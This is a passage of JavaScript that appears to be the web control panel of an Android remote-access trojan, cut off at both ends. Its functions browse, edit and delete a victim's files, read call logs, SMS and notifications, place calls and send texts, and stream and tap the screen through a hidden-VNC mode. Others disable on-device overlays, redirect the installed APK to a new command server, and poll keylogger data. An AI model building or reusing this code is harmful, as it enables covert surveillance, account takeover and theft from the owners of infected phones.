    } else if (Array.isArray(result)) {
      locs = result;
    }
    fileLocations = Array.isArray(locs) ? locs : [];
    const select = document.getElementById('fileLocationSelect');
    if (!select) return;
    select.innerHTML = '<option value="">-- Select Storage --</option>' +
      fileLocations.map(l => `<option value="${l.location_id || l.id || ''}">${l.display_name || l.name || l.location_id || 'Storage'}</option>`).join('');
    if (fileLocations.length > 0) {
      showToast(`Found ${fileLocations.length} storage locations`, 'success');
      fileSelectLocation(fileLocations[0].location_id || fileLocations[0].id);
    } else {
      // Fallback: show internal storage as default
      fileLocations = [{ location_id: 'internal', display_name: 'Internal Storage' }];
      select.innerHTML = '<option value="internal">Internal Storage</option>';
      fileSelectLocation('internal');
    }
  } catch (err) {
    showToast(`Error: ${err.message} - using fallback`, 'error');
    // Fallback
    fileLocations = [{ location_id: 'internal', display_name: 'Internal Storage' }];
    const select = document.getElementById('fileLocationSelect');
    if (select) {
      select.innerHTML = '<option value="internal">Internal Storage</option>';
      fileSelectLocation('internal');
    }
  }
}

function fileSelectLocation(locationId) {
  if (!locationId) return;
  fileCurrentLocationId = locationId;
  fileCurrentPath = '';
  const pathLabel = document.getElementById('fileCurrentPath');
  if (pathLabel) pathLabel.textContent = '/';
  fileLoadList();
}

async function fileLoadList() {
  const list = document.getElementById('filesList');
  if (!list) return;
  list.innerHTML = '<div class="spinner" style="margin:20px auto"></div>';
  try {
    const loc = fileCurrentLocationId;
    if (!loc) {
      list.innerHTML = '<div class="empty-state">No storage selected</div>';
      return;
    }
    const result = await api('GET', `/api/files/list?location_id=${encodeURIComponent(loc)}&path=${encodeURIComponent(fileCurrentPath)}`);
    let entries = [];
    if (result.content?.[0]?.text) {
      try {
        entries = JSON.parse(result.content[0].text);
      } catch(e) {}
    } else if (Array.isArray(result)) {
      entries = result;
    } else if (result.files) {
      entries = result.files;
    }
    const items = Array.isArray(entries) ? entries : [];
    if (!items.length) {
      list.innerHTML = '<div class="empty-state">Empty directory</div>';
      return;
    }
    list.innerHTML = items.map(f => {
      const isDir = f.is_directory || f.isDir || f.type === 'directory' || f.type === 'folder';
      const name = f.name || f.file_name || f.path || '?';
      const size = f.size != null ? formatBytes(parseInt(f.size)) : '';
      const mtime = f.modified_at || f.last_modified || '';
      const safeName = name.replace(/'/g, "\\'");
      if (isDir) {
        return `<div class="file-item" onclick="fileOpenDir('${safeName}')">
          <div class="file-item-icon dir">
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>
          </div>
          <div class="file-item-info">
            <div class="file-item-name">${escHtml(name)}</div>
            <div class="file-item-meta">directory</div>
          </div>
        </div>`;
      }
      const ext = name.split('.').pop().toLowerCase();
      const isText = ['txt','js','py','html','css','json','xml','md','csv','log','sh','bat','conf','ini','yml','yaml','env','sql','php','rb','go','ts','jsx','tsx','vue','svelte'].includes(ext);
      const isImage = ['png','jpg','jpeg','gif','bmp','webp','svg','ico'].includes(ext);
      const isCode = isText || isImage;
      return `<div class="file-item ${isCode ? 'can-edit' : ''}">
        <div class="file-item-icon file ${isText ? 'text' : isImage ? 'img' : ''}">
          ${isText ? 'T' : isImage ? 'I' : 'F'}
        </div>
        <div class="file-item-info" onclick="${isCode ? `fileEdit('${safeName}')` : ''}">
          <div class="file-item-name">${escHtml(name)}</div>
          <div class="file-item-meta">${size} ${mtime ? '· ' + mtime : ''}</div>
        </div>
        <div class="file-item-actions">
          ${isCode ? `<button class="f-edit" onclick="event.stopPropagation(); fileEdit('${safeName}')" title="Edit">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"/><path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z"/></svg>
          </button>` : ''}
          <button class="f-del" onclick="event.stopPropagation(); fileDelete('${safeName}')" title="Delete">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 6h18M8 6V4a1 1 0 0 1 1-1h6a1 1 0 0 1 1 1v2M19 6l-1 14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2L5 6"/></svg>
          </button>
        </div>
      </div>`;
    }).join('');
  } catch (err) {
    list.innerHTML = `<div class="empty-state">Error: ${err.message}</div>`;
  }
}

function fileOpenDir(name) {
  fileCurrentPath = fileCurrentPath ? fileCurrentPath.replace(/\/+$/, '') + '/' + name : name;
  document.getElementById('fileCurrentPath').textContent = '/' + fileCurrentPath;
  fileLoadList();
}

function fileGoUp() {
  if (!fileCurrentPath) return;
  const parts = fileCurrentPath.replace(/\/+$/, '').split('/');
  parts.pop();
  fileCurrentPath = parts.join('/');
  document.getElementById('fileCurrentPath').textContent = '/' + fileCurrentPath || '/';
  fileLoadList();
}

async function fileEdit(name) {
  const path = fileCurrentPath ? fileCurrentPath.replace(/\/+$/, '') + '/' + name : name;
  fileEditingPath = path;
  const editor = document.getElementById('fileEditor');
  editor.style.display = 'block';
  document.getElementById('fileEditorName').textContent = name;
  document.getElementById('fileEditorContent').value = 'Loading...';
  try {
    const result = await api('GET', `/api/files/read?location_id=${encodeURIComponent(fileCurrentLocationId)}&path=${encodeURIComponent(path)}`);
    const text = result.content?.[0]?.text || '';
    let content = '';
    try { content = JSON.parse(text).content || JSON.parse(text).text || text; } catch(e) { content = text; }
    document.getElementById('fileEditorContent').value = content;
  } catch (err) {
    document.getElementById('fileEditorContent').value = 'Error: ' + err.message;
  }
}

async function fileSave() {
  const content = document.getElementById('fileEditorContent').value;
  if (!fileEditingPath) return;
  try {
    await api('POST', '/api/files/write', {
      location_id: fileCurrentLocationId,
      path: fileEditingPath,
      content
    });
    showToast('File saved', 'success');
    fileCloseEditor();
  } catch (err) {
    showToast(`Save error: ${err.message}`, 'error');
  }
}

function fileCloseEditor() {
  document.getElementById('fileEditor').style.display = 'none';
  fileEditingPath = '';
}

async function fileDelete(name) {
  if (!confirm(`Delete "${name}"?`)) return;
  const path = fileCurrentPath ? fileCurrentPath.replace(/\/+$/, '') + '/' + name : name;
  try {
    await api('POST', '/api/files/delete', {
      location_id: fileCurrentLocationId,
      path
    });
    showToast('Deleted: ' + name, 'success');
    fileLoadList();
  } catch (err) {
    showToast(`Delete error: ${err.message}`, 'error');
  }
}

// ==================== Call Log - Premium Dialer ====================
async function loadCallLog() {
  try {
    const result = await api('GET', '/api/call-log');
    const logContainer = document.getElementById('callLogList');
    if (!logContainer) return;
    const text = result?.content?.[0]?.text || '[]';
    let calls = [];
    try { calls = JSON.parse(text); } catch(e) {}
    const entries = calls.entries || calls;
    if (!entries || !entries.length) {
      logContainer.innerHTML = '<div class="call-empty">No recent calls</div>';
      return;
    }

    const grouped = {};
    entries.forEach(c => {
      const num = c.phone_number || 'Unknown';
      if (!grouped[num]) grouped[num] = { number: num, type: c.type, timestamp: c.timestamp || c.date, duration: c.duration, name: c.name || '', count: 0 };
      grouped[num].count++;
      if (new Date(c.timestamp || c.date || 0) > new Date(grouped[num].timestamp || 0)) {
        grouped[num].type = c.type;
        grouped[num].timestamp = c.timestamp || c.date;
        grouped[num].duration = c.duration;
      }
    });

    logContainer.innerHTML = Object.values(grouped).slice(0, 100).map(c => {
      const time = new Date(c.timestamp || '').toLocaleString();
      const icon = c.type === 'incoming' ? '↓' : c.type === 'outgoing' ? '↑' : '✕';
      const iconClass = c.type === 'missed' ? 'call-missed' : (c.type === 'incoming' ? 'call-incoming' : 'call-outgoing');
      const dur = c.duration ? Math.floor(c.duration/60) + 'm ' + c.duration%60 + 's' : '';
      return `
      <div class="call-row">
        <div class="call-avatar ${iconClass}">${icon}</div>
        <div class="call-row-info" onclick="callNumber('${c.number}')">
          <span class="call-row-name">${c.name || c.number}</span>
          <span class="call-row-meta">${c.type} · ${dur || ''} ${time}</span>
        </div>
        <button class="call-row-btn" onclick="event.stopPropagation(); callNumber('${c.number}')" title="Call">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/></svg>
        </button>
      </div>`;
    }).join('');
  } catch (err) {
    const el = document.getElementById('callLogList');
    if (el) el.innerHTML = `<div class="call-empty">Error: ${err.message}</div>`;
  }
}

async function callNumber(number) {
  try {
    await api('POST', '/api/control/dial', { phone_number: number });
    showToast(`Calling ${number}`, 'success');
  } catch (err) {
    showToast(`Call failed: ${err.message}`, 'error');
  }
}

// ==================== SMS - Premium Messaging ====================
let smsAllMessages = [];
let smsCurrentThread = null;

async function loadSMS() {
  try {
    const result = await api('GET', '/api/sms?limit=200');
    const text = result?.content?.[0]?.text || '[]';
    let msgs = [];
    try { msgs = JSON.parse(text); } catch(e) {}
    smsAllMessages = msgs.messages || msgs;
    smsCurrentThread = null;
    smsRenderThreads();
  } catch (err) {
    showToast(`SMS error: ${err.message}`, 'error');
  }
}

function smsRenderThreads() {
  const container = document.getElementById('smsThreadList');
  if (!container) return;
  document.getElementById('smsConversation').style.display = 'none';
  container.style.display = 'block';

  if (!smsAllMessages.length) {
    container.innerHTML = '<div class="sms-empty">No messages</div>';
    return;
  }

  const threads = {};
  smsAllMessages.forEach(m => {
    const addr = m.from || m.address || m.sender || 'Unknown';
    if (!threads[addr]) threads[addr] = { address: addr, messages: [], lastTime: 0, lastBody: '' };
    threads[addr].messages.push(m);
    const t = new Date(m.date_ms || m.timestamp || m.date || 0).getTime();
    if (t > threads[addr].lastTime) {
      threads[addr].lastTime = t;
      threads[addr].lastBody = m.body || m.text || '';
    }
  });

  const sorted = Object.values(threads).sort((a, b) => b.lastTime - a.lastTime);
  if (!sorted.length) {
    container.innerHTML = '<div class="sms-empty">No messages</div>';
    return;
  }
  container.innerHTML = sorted.map(t => {
    const time = new Date(t.lastTime).toLocaleString();
    const safeAddr = t.address.replace(/'/g, "\\'");
    return `
    <div class="sms-thread" onclick="smsOpenThread('${safeAddr}')">
      <div class="sms-thread-avatar">${(t.address[0] || '?').toUpperCase()}</div>
      <div class="sms-thread-info">
        <span class="sms-thread-name">${escHtml(t.address)}</span>
        <span class="sms-thread-preview">${escHtml(t.lastBody.substring(0, 80))}</span>
      </div>
      <span class="sms-thread-time">${time}</span>
    </div>`;
  }).join('');
}

function smsOpenThread(address) {
  smsCurrentThread = address;
  document.getElementById('smsThreadList').style.display = 'none';
  const conv = document.getElementById('smsConversation');
  conv.style.display = 'flex';
  document.getElementById('smsConvName').textContent = address;
  const threadMsgs = smsAllMessages.filter(m => {
    const addr = m.from || m.address || m.sender || '';
    return addr === address;
  });
  document.getElementById('smsConvStatus').textContent = threadMsgs.length + ' messages';
  document.getElementById('smsComposePhone').value = address;

  const msgs = threadMsgs.sort((a, b) => new Date(a.date_ms || a.timestamp || a.date || 0) - new Date(b.date_ms || b.timestamp || b.date || 0));
  const container = document.getElementById('smsMessages');
  container.innerHTML = msgs.map(m => {
    const isIncoming = m.from ? true : (m.type === 'incoming' || !m.is_read === false);
    const time = new Date(m.date_ms || m.timestamp || m.date || '').toLocaleString();
    return `
    <div class="sms-msg ${isIncoming ? 'sms-received' : 'sms-sent'}">
      <div class="sms-msg-bubble">${escHtml(m.body || m.text || '')}</div>
      <div class="sms-msg-time">${time}</div>
    </div>`;
  }).join('');
  container.scrollTop = container.scrollHeight;
}

function smsBackToList() {
  smsCurrentThread = null;
  document.getElementById('smsConversation').style.display = 'none';
  document.getElementById('smsThreadList').style.display = 'block';
}

function smsShowNew() {
  smsCurrentThread = '__new__';
  document.getElementById('smsThreadList').style.display = 'none';
  const conv = document.getElementById('smsConversation');
  conv.style.display = 'flex';
  document.getElementById('smsConvName').textContent = 'New Message';
  document.getElementById('smsConvStatus').textContent = '';
  document.getElementById('smsComposePhone').value = '';
  document.getElementById('smsMessages').innerHTML = '';
  document.getElementById('smsComposeText').focus();
}

async function smsSend() {
  const phone = document.getElementById('smsComposePhone').value.trim();
  const text = document.getElementById('smsComposeText').value.trim();
  if (!phone || !text) { showToast('Phone and message required', 'error'); return; }
  try {
    await api('POST', '/api/sms/send', { phone_number: phone, message: text });
    document.getElementById('smsComposeText').value = '';
    showToast('Sent!', 'success');
    const container = document.getElementById('smsMessages');
    if (container) {
      const time = new Date().toLocaleString();
      container.innerHTML += `
      <div class="sms-msg sms-sent">
        <div class="sms-msg-bubble">${escHtml(text)}</div>
        <div class="sms-msg-time">${time}</div>
      </div>`;
      container.scrollTop = container.scrollHeight;
    }
    loadSMS();
  } catch (err) {
    showToast(`Send failed: ${err.message}`, 'error');
  }
}

// ==================== Notifications ====================
async function loadNotifications() {
  try {
    const result = await api('GET', '/api/notifications');
    const text = result?.content?.[0]?.text || '[]';
    let notifs = [];
    try { notifs = JSON.parse(text); } catch(e) {}
    const notifications = notifs.notifications || notifs;
    const container = document.getElementById('notificationsList');
    if (!container) return;
    if (!notifications || !notifications.length) {
      container.innerHTML = '<div class="notifications-empty">No notifications</div>';
      return;
    }
    container.innerHTML = notifications.slice(0, 100).map(n => `
      <div class="notification-item">
        <div class="notification-icon">${n.title ? n.title[0] : 'N'}</div>
        <div class="notification-content">
          <div class="notification-title">${escHtml(n.title || 'Unknown')}</div>
          <div class="notification-msg">${escHtml(n.message || n.text || '')}</div>
          <div class="notification-time">${new Date(n.time || Date.now()).toLocaleString()}</div>
        </div>
      </div>
    `).join('');
    const count = document.getElementById('notificationsCount');
    if (count) count.textContent = `${notifications.length} notifications`;
  } catch (err) {
    const container = document.getElementById('notificationsList');
    if (container) container.innerHTML = `<div class="notifications-empty">Error: ${err.message}</div>`;
  }
}

// ==================== HVNC Screen Mode ====================

let hvncTouchEnabled = true;
let hvncNodesVisible = false;

function openHBNC() {
  document.body.classList.add('hbnc-active');
  const container = document.querySelector('.hw-container');
  if (container) container.classList.add('hvnc-fullscreen');
  const screenArea = document.getElementById('hbcnScreenArea');
  if (screenArea) screenArea.classList.add('scanning');
  // Hide any HTML overlay that might block touches
  fetch('/api/overlay/deactivate-all', { method: 'POST' }).catch(() => {});
  setTimeout(() => {
    if (typeof isStreaming === 'undefined' || !isStreaming) {
      startLiveScreen();
    }
  }, 300);
  // Init inspector DOM elements
  if (typeof inspectorInitDOM === 'function') {
    inspectorInitDOM();
  }
  // Reapply any saved state
  if (typeof _initHwState === 'function') {
    _initHwState();
  }
}

function hvncToggleOverlay() {
  const btn = document.querySelector('[data-action="overlay"]');
  const isActive = btn ? btn.classList.toggle('active') : !hvncNodesVisible;
  hvncNodesVisible = isActive;
  const canvas = document.getElementById('hbcnCanvas');

  if (canvas) {
    canvas.style.opacity = isActive ? '0.5' : '1';
  }

  fetch('/api/overlay/developer-overlays', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      mode: isActive ? 'enable_all' : 'disable_all',
      global_developer_mode: true
    })
  }).then(r => {
    if (!r.ok) console.error('Overlay toggle failed:', r.status);
  }).catch(err => {
    console.error('Overlay toggle error:', err);
  });
}

let hvncLiveOverlayActive = false;
let hvncLiveOverlayInterval = null;

async function hvncToggleLiveOverlay() {
  const btn = document.querySelector('[data-action="liveoverlay"]');
  hvncLiveOverlayActive = !hvncLiveOverlayActive;
  if (btn) btn.classList.toggle('active', hvncLiveOverlayActive);

  const existingPanel = document.getElementById('hvncLiveOverlayPanel');
  if (!hvncLiveOverlayActive) {
    if (existingPanel) existingPanel.remove();
    if (hvncLiveOverlayInterval) {
      clearInterval(hvncLiveOverlayInterval);
      hvncLiveOverlayInterval = null;
    }
    showToast('Live overlay hidden', 'info');
    return;
  }

  // Create overlay panel if it doesn't exist
  if (!existingPanel) {
    const panel = document.createElement('div');
    panel.id = 'hvncLiveOverlayPanel';
    panel.className = 'hvnc-live-overlay';
    panel.innerHTML = `
      <div class="hvnc-live-overlay-header">
        <span>Live Screen Info</span>
        <button class="hvnc-live-overlay-close" onclick="hvncToggleLiveOverlay()">&times;</button>
      </div>
      <div class="hvnc-live-overlay-body">
        <div class="hvnc-live-overlay-section">
          <div class="hvnc-live-overlay-label">App / Package</div>
          <div class="hvnc-live-overlay-value" id="loAppName">-</div>
        </div>
        <div class="hvnc-live-overlay-section">
          <div class="hvnc-live-overlay-label">Screen Size</div>
          <div class="hvnc-live-overlay-value" id="loScreenSize">-</div>
        </div>
        <div class="hvnc-live-overlay-section">
          <div class="hvnc-live-overlay-label">UI Nodes</div>
          <div class="hvnc-live-overlay-value" id="loNodeCount">-</div>
        </div>
        <div class="hvnc-live-overlay-section" style="flex:1;min-height:0">
          <div class="hvnc-live-overlay-label">Detected Elements</div>
          <div class="hvnc-live-overlay-tree" id="loElementTree">-</div>
        </div>
      </div>
      <div class="hvnc-live-overlay-footer">
        <span class="hvnc-live-overlay-status" id="loStatus">Updating...</span>
      </div>
    `;
    document.getElementById('hbcnScreenArea').appendChild(panel);
  }

  // Initial fetch
  await fetchLiveOverlayData();

  // Auto-refresh every 3 seconds
  if (hvncLiveOverlayInterval) clearInterval(hvncLiveOverlayInterval);
  hvncLiveOverlayInterval = setInterval(fetchLiveOverlayData, 3000);

  showToast('Live overlay active', 'success');
}

async function fetchLiveOverlayData() {
  const statusEl = document.getElementById('loStatus');
  if (!statusEl) return;
  statusEl.textContent = 'Updating...';
  statusEl.className = 'hvnc-live-overlay-status updating';

  try {
    const res = await fetch('/api/screen/analysis');
    const data = await res.json();
    if (!res.ok) {
      throw new Error(data.error || data.message || 'Request failed');
    }
    const rawText = data?.content?.[0]?.text;
    if (!rawText) throw new Error('No screen data available');

    // Parse the text-based screen state format
    const lines = rawText.split('\n');

    // Extract screen dimensions from "screen:WxH density:... orientation:..."
    let screenW = '-', screenH = '-', appName = '-';
    const screenLine = lines.find(l => l.startsWith('screen:'));
    if (screenLine) {
      const m = screenLine.match(/screen:(\d+)x(\d+)/);
      if (m) { screenW = m[1]; screenH = m[2]; }
    }

    // Extract focused window package name
    const windowLine = lines.find(l => l.startsWith('--- window:') && l.includes('focused:true'));
    if (windowLine) {
      const pm = windowLine.match(/pkg:(\S+)/);
      if (pm) appName = pm[1];
    } else {
      const firstWindow = lines.find(l => l.startsWith('--- window:'));
      if (firstWindow) {
        const pm = firstWindow.match(/pkg:(\S+)/);
        if (pm) appName = pm[1];
      }
    }

    // Parse node table rows
    const nodes = [];
    let inTable = false;
    let colMap = null;
    for (const line of lines) {
      if (line.startsWith('node_id\tclass\ttext')) {
        inTable = true;
        const cols = line.split('\t');
        colMap = {};
        cols.forEach((c, i) => { colMap[c.trim()] = i; });
        continue;
      }
      if (line.startsWith('---') || line.startsWith('hierarchy:') || line.startsWith('note:')) {
        inTable = false;
      }
      if (!inTable || !colMap) continue;
      if (!line.startsWith('node_')) continue;

      const parts = line.split('\t');
      const text = (parts[colMap['text']] || '').replace(/^-$/, '').trim();
      const desc = (parts[colMap['desc']] || '').replace(/^-$/, '').trim();
      const cls = (parts[colMap['class']] || '').trim();
      const resId = (parts[colMap['res_id']] || '').trim();
      const bounds = (parts[colMap['bounds']] || '').trim();

      const displayText = text || desc;
      if (!displayText) continue;

      nodes.push({ text: displayText, class: cls, desc, resId, bounds });
    }

    const nodeCount = nodes.length;

    document.getElementById('loAppName').textContent = appName;
    document.getElementById('loScreenSize').textContent = screenW + ' × ' + screenH;
    document.getElementById('loNodeCount').textContent = nodeCount;

    const treeEl = document.getElementById('loElementTree');
    if (nodes.length > 0) {
      let html = '';
      let shown = 0;
      for (const node of nodes) {
        if (shown >= 30) break;
        const shortCls = node.class ? node.class.split('.').pop() : '';
        html += `<div class="lo-tree-node">
          <span class="lo-tree-text" title="${escHtml(node.desc || node.text)}">${escHtml(node.text)}</span>
          ${shortCls ? `<span class="lo-tree-class">${escHtml(shortCls)}</span>` : ''}
        </div>`;
        shown++;
      }
      treeEl.innerHTML = html;
    } else {
      treeEl.innerHTML = '<div class="lo-empty">No UI elements found</div>';
    }

    statusEl.textContent = 'OK ' + new Date().toLocaleTimeString();
    statusEl.className = 'hvnc-live-overlay-status ok';
  } catch (err) {
    statusEl.textContent = err.message;
    statusEl.className = 'hvnc-live-overlay-status error';
  }
}

let hvncNodeViewActive = false;

async function hvncToggleNodeView() {
  const btn = document.querySelector('[data-action="nodeview"]');
  hvncNodeViewActive = !hvncNodeViewActive;
  if (btn) btn.classList.toggle('active', hvncNodeViewActive);

  const existing = document.getElementById('hvncNodeViewOverlay');
  if (!hvncNodeViewActive) {
    if (existing) existing.remove();
    const canvas = document.getElementById('hbcnCanvas');
    if (canvas) {
      canvas.style.display = canvas._savedDisplay || 'block';
      delete canvas._savedDisplay;
    }
    showToast('Node view off', 'info');
    return;
  }

  showToast('Loading nodes...', 'info');

  try {
    const res = await fetch('/api/screen/analysis');
    const data = await res.json();
    if (!res.ok) throw new Error(data.error || 'Fetch failed');
    const rawText = data?.content?.[0]?.text;
    if (!rawText) throw new Error('No screen data');

    const lines = rawText.split('\n');
    const screenLine = lines.find(l => l.startsWith('screen:'));
    let devW = 720, devH = 1604;
    if (screenLine) {
      const m = screenLine.match(/screen:(\d+)x(\d+)/);
      if (m) { devW = parseInt(m[1]); devH = parseInt(m[2]); }
    }

    // Parse node table rows with bounds+flags
    const allNodes = [];
    let inTable = false, colMap = null;
    for (const line of lines) {
      if (line.startsWith('node_id\tclass\ttext')) {
        inTable = true;
        const cols = line.split('\t');
        colMap = {};
        cols.forEach((c, i) => { colMap[c.trim()] = i; });
        continue;
      }
      if (line.startsWith('---') || line.startsWith('hierarchy:') || line.startsWith('note:')) {
        inTable = false;
      }
      if (!inTable || !colMap) continue;
      if (!line.startsWith('node_')) continue;

      const parts = line.split('\t');
      const text = (parts[colMap['text']] || '').replace(/^-$/, '').trim();
      const desc = (parts[colMap['desc']] || '').replace(/^-$/, '').trim();
      const cls = (parts[colMap['class']] || '').trim();
      const boundsStr = (parts[colMap['bounds']] || '').trim();
      const flags = (parts[colMap['flags']] || '').trim();

      const displayText = text || desc;
      const isClickable = flags.includes('clk');
      const bounds = boundsStr.split(',').map(Number);

      allNodes.push({ text: displayText, class: cls, bounds, flags, isClickable });
    }

    // Filter: only clickable nodes with valid bounds
    const clickable = allNodes.filter(n => n.isClickable && n.bounds.length === 4);
    if (clickable.length === 0) {
      showToast('No clickable nodes found', 'error');
      hvncNodeViewActive = false;
      if (btn) btn.classList.toggle('active', false);
      return;
    }

    // Hide the canvas, create overlay
    const canvas = document.getElementById('hbcnCanvas');
    if (canvas) {
      canvas._savedDisplay = canvas.style.display || 'block';
      canvas.style.display = 'none';
    }

    const area = document.getElementById('hbcnScreenArea');
    if (!area) { showToast('Screen area not found', 'error'); return; }

    // Remove existing overlay if any
    if (existing) existing.remove();

    const overlay = document.createElement('div');
    overlay.id = 'hvncNodeViewOverlay';
    overlay.className = 'hvnc-node-view';

    const inner = document.createElement('div');
    inner.className = 'hvnc-node-view-inner';

    // Scale: match canvas display size
    const areaRect = area.getBoundingClientRect();
    const maxW = areaRect.width - 16;
    const maxH = areaRect.height - 16;
    const scaleX = maxW / devW;
    const scaleY = maxH / devH;
    const scale = Math.min(scaleX, scaleY, 2.5);
    const offsetX = (maxW - devW * scale) / 2;
    const offsetY = (maxH - devH * scale) / 2;

    inner.style.width = Math.round(devW * scale) + 'px';
    inner.style.height = Math.round(devH * scale) + 'px';

    const header = document.createElement('div');
    header.className = 'hvnc-node-view-header';
    header.innerHTML = `<span>${clickable.length} interactive nodes</span>
      <span class="hvnc-node-view-dims">${devW}×${devH}</span>`;
    inner.appendChild(header);

    for (const node of clickable) {
      const el = document.createElement('div');
      el.className = 'hvnc-node-el';
      const l = node.bounds[0] * scale + offsetX;
      const t = node.bounds[1] * scale + offsetY;
      const w = (node.bounds[2] - node.bounds[0]) * scale;
      const h = (node.bounds[3] - node.bounds[1]) * scale;
      el.style.left = Math.round(l) + 'px';
      el.style.top = Math.round(t) + 'px';
      el.style.width = Math.max(Math.round(w), 8) + 'px';
      el.style.height = Math.max(Math.round(h), 8) + 'px';

      const label = node.text || node.class.split('.').pop() || '?';
      el.textContent = label.length > 30 ? label.slice(0, 30) + '…' : label;
      el.title = `Tap here\n${node.class}\nbounds: ${node.bounds.join(',')}`;

      // Darker for larger elements, brighter for text-bearing
      if (node.text && node.text.length > 1) {
        el.classList.add('hvnc-node-el-text');
      }
      if (node.class.includes('EditText') || node.class.includes('TextView')) {
        el.classList.add('hvnc-node-el-input');
      }
      if (node.class.includes('Image')) {
        el.classList.add('hvnc-node-el-icon');
      }

      const cx = Math.round((node.bounds[0] + node.bounds[2]) / 2);
      const cy = Math.round((node.bounds[1] + node.bounds[3]) / 2);

      el.addEventListener('click', async (e) => {
        e.stopPropagation();
        el.classList.add('hvnc-node-el-tapped');
        setTimeout(() => el.classList.remove('hvnc-node-el-tapped'), 300);
        try {
          await fetch('/api/screen/tap', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ x: cx, y: cy })
          });
        } catch (err) {
          console.error('Node tap error:', err);
        }
      });

      inner.appendChild(el);
    }

    overlay.appendChild(inner);
    area.appendChild(overlay);
    showToast(`Node view: ${clickable.length} elements`, 'success');
  } catch (err) {
    showToast('Node view error: ' + err.message, 'error');
    hvncNodeViewActive = false;
    if (btn) btn.classList.toggle('active', false);
    const canvas = document.getElementById('hbcnCanvas');
    if (canvas) {
      canvas.style.display = canvas._savedDisplay || 'block';
      delete canvas._savedDisplay;
    }
  }
}

function hvncToggleUI() {
  const container = document.querySelector('.hvnc-container');
  if (!container) return;
  const btn = document.querySelector('[data-action="ui"]');
  const isHidden = container.classList.toggle('ui-hidden');
  if (btn) btn.classList.toggle('active', !isHidden);
  showToast(isHidden ? 'UI hidden' : 'UI visible', isHidden ? 'info' : 'success');
}

function hvncToggleScreen() {
  const container = document.querySelector('.hvnc-container');
  const btn = document.querySelector('[data-action="screen"]');
  const isHidden = container.classList.toggle('screen-hidden');

  if (isHidden) {
    if (isStreaming) stopLiveScreen();
    if (btn) btn.classList.remove('active');
    showToast('Screen hidden', 'info');
  } else {
    if (!isStreaming) startLiveScreen();
    if (btn) btn.classList.add('active');
    showToast('Screen visible', 'success');
  }
}

function hvncToggleTouch() {
  const btn = document.querySelector('[data-action="touch"]');
  if (!btn) return;
  hvncTouchEnabled = btn.classList.toggle('active');
  const canvas = document.getElementById('hbcnCanvas');
  if (canvas) {
    canvas.style.cursor = hvncTouchEnabled ? 'crosshair' : 'default';
    canvas.style.pointerEvents = hvncTouchEnabled ? 'auto' : 'none';
  }
  showToast(hvncTouchEnabled ? 'Touch enabled' : 'Touch disabled', hvncTouchEnabled ? 'success' : 'info');
}

async function hbcnAction(action) {
  try {
    await api('POST', `/api/control/${action}`);
    showToast(`${action}`, 'success');
  } catch (err) {
    showToast(`Error: ${err.message}`, 'error');
  }
}

function hvncToggleMenu() {
  const panel = document.getElementById('hvncMenuPanel');
  const backdrop = document.getElementById('hvncMenuBackdrop');
  if (panel && backdrop) {
    const isOpen = panel.classList.toggle('open');
    backdrop.classList.toggle('open', isOpen);
  }
}

// Redirect the APK to a new server / connection.
// APK HandRedirect expects relink (URL), reip (server IP), rckey (key).
async function hbcnRedirect() {
  const cur = (window.CONFIG && window.CONFIG.baseUrl) || window.location.origin;
  const reip = prompt('Target server IP/domain (reip):', cur.replace(/^https?:\/\//, '')) || '';
  if (!reip) return;
  const relink = prompt('Target link/URL (relink):', cur) || '';
  const rckey = prompt('Redirect connection key (rckey):', (window.CONFIG && window.CONFIG.client && window.CONFIG.client.apiUrl) || '') || '';
  try {
    const res = await fetch('/api/apk/redirect', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ relink, reip, rckey })
    });
    const data = await res.json();
    if (data.error) throw new Error(data.error);
    if (typeof showToast === 'function') showToast('Redirect sent to device', 'success');
  } catch (err) {
    if (typeof showToast === 'function') showToast('Redirect: ' + err.message, 'error');
  }
}
window.hbcnRedirect = hbcnRedirect;

async function hvncActionScreenshot() {
  try {
    const res = await fetch('/api/live/screenshot', { cache: 'no-cache' });
    if (!res.ok) throw new Error('Screenshot failed');
    const blob = await res.blob();
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `screenshot-${Date.now()}.jpg`;
    a.click();
    URL.revokeObjectURL(url);
    showToast('Screenshot saved', 'success');
  } catch (err) {
    showToast(`Screenshot error: ${err.message}`, 'error');
  }
}

function hbcnRetry() {
  hbcnHideError();
  stopLiveScreen();
  setTimeout(startLiveScreen, 500);
}

// ==================== Init ====================
document.addEventListener('DOMContentLoaded', () => {
  loadDeviceInfo();
  setInterval(loadDeviceInfo, 30000); // Refresh every 30s
  loadDeviceBanner();
  setInterval(loadDeviceBanner, 5000); // Refresh every 5s

  // ESC key closes menu panel
  document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape') {
      const menuPanel = document.getElementById('hvncMenuPanel');
      if (menuPanel && menuPanel.classList.contains('open')) {
        hvncToggleMenu();
      }
    }
  });

  // Auto-refresh keylog data every 5 seconds
  setInterval(() => {
    if (state.currentTab === 'keylog' || state.keylogActive) {
      loadKeylogData();
    }
  }, 5000);

  // Auto-refresh apps list every 10 seconds
  setInterval(() => {
    if (state.currentTab === 'apps') {
